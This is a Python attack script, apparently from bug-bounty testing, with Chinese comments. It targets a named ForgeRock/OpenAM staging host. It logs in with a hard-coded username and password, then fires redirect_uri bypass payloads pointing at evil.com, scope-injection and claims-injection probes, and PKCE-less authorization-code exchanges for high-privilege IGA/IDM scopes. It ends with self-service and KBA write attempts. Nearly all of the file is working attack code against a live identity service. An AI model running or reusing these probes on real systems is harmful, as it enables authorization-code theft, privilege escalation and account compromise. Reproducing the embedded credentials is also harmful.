# -*- coding: utf-8 -*-
"""AIC 第二十二轮:接口逻辑面(续)——redirect_uri 校验复测 + 无 PKCE 高权限 scope + selfservice action
重点验证 C1 发现:无 PKCE 的授权码流,在 fr:iga:*/fr:idm:* 高权限 scope 下是否同样可交换
"""
import requests, urllib3, json, base64, hashlib, os, time
urllib3.disable_warnings()

BASE = 'https://openam-bug-bounty-stag.forgeblocks.com'
AUTH = BASE + '/am/json/realms/alpha/authenticate'
RU = 'https://openam-bug-bounty-stag.forgeblocks.com/enduser/sessionCheck.html'
USER, PASS = 'pccp', 'Agent360User$5h2!QxR'

S = requests.Session()
S.trust_env = False
S.proxies = {'http': None, 'https': None}
S.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})

# 登录
r = S.post(AUTH, json={}, timeout=15, verify=False)
d = r.json()
authId = d['authId']
cbs = []
for cb in d.get('callbacks', []):
    t = cb['type']
    inp = [{'name': 'IDToken1', 'value': USER}] if t == 'NameCallback' else \
          [{'name': 'IDToken2', 'value': PASS}] if t == 'PasswordCallback' else \
          [{'name': k.get('name'), 'value': k.get('value')} for k in cb.get('input', [])]
    cbs.append({'type': t, 'output': cb.get('output', []), 'input': inp, '_id': cb.get('_id')})
r2 = S.post(AUTH, json={'authId': authId, 'callbacks': cbs}, timeout=15, verify=False)
tok = r2.json().get('tokenId')
print('LOGIN OK:', tok[:40])

def get(path, label='', retry=2):
    for i in range(retry):
        try:
            r = S.get(BASE + path, timeout=15, verify=False, allow_redirects=False)
            loc = r.headers.get('Location', '')
            print('GET  %-70s -> %d  %s%s' % (path[:70], r.status_code, r.text[:120].replace('\n', ' '),
                  (' Loc=' + loc[:130]) if loc else ''))
            return r
        except Exception as e:
            if i == retry - 1:
                print('GET  %-70s -> ERR %s' % (path[:70], str(e)[:80]))
            else:
                time.sleep(2)

print('\n=== B2. redirect_uri 校验复测(带编码+重试) ===')
from urllib.parse import quote
for ru, lab in [
    (RU, '基线正确'),
    ('https://evil.com', '绝对外域'),
    ('https://openam-bug-bounty-stag.forgeblocks.com.evil.com/', '域名后缀'),
    ('https://evil.com/enduser/sessionCheck.html', '外域同路径'),
    ('https://openam-bug-bounty-stag.forgeblocks.com/enduser/sessionCheck.html/', '尾斜杠'),
    ('https://openam-bug-bounty-stag.forgeblocks.com/enduser/sessionCheck.html%23x', 'fragment'),
    ('https://openam-bug-bounty-stag.forgeblocks.com/enduser/sessionCheck.html?x=1', 'query 附加'),
    ('https://openam-bug-bounty-stag.forgeblocks.com@evil.com', '@ 混淆'),
    ('https://openam-bug-bounty-stag.forgeblocks.com', '主域无路径'),
    ('http://openam-bug-bounty-stag.forgeblocks.com/enduser/sessionCheck.html', 'http 降级'),
]:
    p = '/am/oauth2/realms/alpha/authorize?client_id=endUserUIClient&response_type=code&redirect_uri=%s&scope=openid&state=t' % quote(ru, safe='')
    get(p, lab)
    time.sleep(0.5)

print('\n=== E2. authorize 参数逻辑复测 ===')
for extra, lab in [
    ('&prompt=login', 'prompt=login'),
    ('&prompt=none', 'prompt=none 已登录'),
    ('&response_mode=form_post', 'form_post'),
    ('&response_type=token', 'implicit token'),
    ('&response_type=code+token', 'hybrid'),
    ('&max_age=0', 'max_age=0'),
    ('&nonce=x&response_type=id_token', 'id_token 流'),
    ('&scope=openid+admin', 'scope 注入 admin'),
    ('&claims=%7B%22id_token%22%3A%7B%22admin%22%3Anull%7D%7D', 'claims 注入'),
]:
    p = '/am/oauth2/realms/alpha/authorize?client_id=endUserUIClient&redirect_uri=%s&scope=openid&state=t%s' % (quote(RU, safe=''), extra)
    get(p, lab)
    time.sleep(0.5)

print('\n=== C5. 无 PKCE + 高权限 scope 交换验证 ===')
for scope, lab in [('openid fr:iga:*', 'IGA scope'), ('openid fr:idm:*', 'IDM scope'), ('openid profile', 'profile')]:
    p = '/am/oauth2/realms/alpha/authorize?client_id=endUserUIClient&response_type=code&redirect_uri=%s&scope=%s&state=t' % (
        quote(RU, safe=''), quote(scope, safe=''))
    r = get(p, '无PKCE ' + lab)
    if not r:
        continue
    loc = r.headers.get('Location', '')
    code = loc.split('code=')[1].split('&')[0] if 'code=' in loc else None
    if not code:
        print('  no code in Location')
        continue
    # 无 code_verifier 直接交换
    r2 = S.post(BASE + '/am/oauth2/realms/alpha/access_token',
                data={'grant_type': 'authorization_code', 'code': code,
                      'redirect_uri': RU, 'client_id': 'endUserUIClient'}, timeout=12, verify=False)
    print('  noPKCE exchange [%s]: %d %s' % (lab, r2.status_code, r2.text[:200].replace('\n', ' ')))
    time.sleep(0.5)

print('\n=== F. selfservice action 探测 ===')
# userRegistration / forgottenUsername 支持 POST action
for ep in ['selfservice/userRegistration', 'selfservice/forgottenUsername']:
    for act in ['create', 'search', 'read', 'submitRequirements', 'getRequirements']:
        try:
            r = S.post(BASE + '/am/json/realms/alpha/' + ep + '?_action=' + act,
                       json={}, timeout=12, verify=False)
            print('POST %s?_action=%-18s -> %d %s' % (ep, act, r.status_code, r.text[:120].replace('\n', ' ')))
        except Exception as e:
            print('POST %s?_action=%s -> ERR %s' % (ep, act, str(e)[:60]))
        time.sleep(0.3)

print('\n=== G. KBA 接口:登录后读取问题(基线已 200),测写操作 ===')
# KBA 是否有修改接口(改问题=存储型影响?)
for m in ['PUT', 'POST']:
    try:
        r = S.request(m, BASE + '/am/json/realms/alpha/selfservice/kba',
                      json={'questions': {'1': {'en': 'x'}}}, timeout=12, verify=False)
        print('%s selfservice/kba -> %d %s' % (m, r.status_code, r.text[:120].replace('\n', ' ')))
    except Exception as e:
        print('%s selfservice/kba -> ERR %s' % (m, str(e)[:60]))
